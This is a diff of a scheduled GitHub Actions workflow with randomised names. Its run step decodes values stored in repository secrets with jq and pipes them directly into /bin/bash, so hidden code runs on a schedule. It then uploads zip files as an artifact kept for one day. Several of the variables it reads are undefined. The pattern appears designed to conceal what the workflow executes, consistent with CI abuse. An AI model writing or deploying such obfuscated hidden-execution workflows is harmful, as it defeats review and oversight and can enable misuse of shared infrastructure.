@@ -1,32 +1,26 @@
 name: ronglijieshi
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '25 1/6 * * *'
-jobs:  # 3835
+    - cron: '22 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: ronglijieshi
         env:
-          usvr97: ${{ secrets.usvr97 }}
+          j0441: ${{ secrets.j0441 }}
         run: |
-          echo $usvr97 | jq -r .jr60853 | /bin/bash
-          echo $seux5 | jq -r .ieg3 | /bin/bash
-          echo $prry2523 | jq -r .nlr72409 | /bin/bash
-          echo $zhshr26065 | jq -r .bbkxo61 | /bin/bash
-          echo $m21 | jq -r .edsan47673 | /bin/bash
-          echo $zjaru9 | jq -r .hroc789 | /bin/bash
-          echo $wcg93845 | jq -r .jne40 | /bin/bash
-          echo $fgo3036 | jq -r .xbp68356 | /bin/bash
-          echo $zvv86 | jq -r .vwceq36 | /bin/bash
-          echo $ky40604 | jq -r .vqxu83 | /bin/bash
-          echo $rp9623 | jq -r .bpch0 | /bin/bash
-          echo $gs194 | jq -r .rlacc8 | /bin/bash
-          echo $sxcm92 | jq -r .ttagq5 | /bin/bash
-          echo $ek96658 | jq -r .ixv72 | /bin/bash
-          echo $lml5 | jq -r .tttrp04245 | /bin/bash
-          echo $wwh8 | jq -r .ylwmh95304 | /bin/bash
+          printf '%s' "$j0441" | jq -r .xdo36 | /bin/bash
+          printf '%s' "$efcx88149" | jq -r .jgd3 | /bin/bash
+          echo $xnouz236 | jq -r .fr36 | /bin/bash
+          echo $hk23250 | jq -r .rtfs0522 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: hGYpCsi1
+          path: "*.zip"
+          retention-days: 1
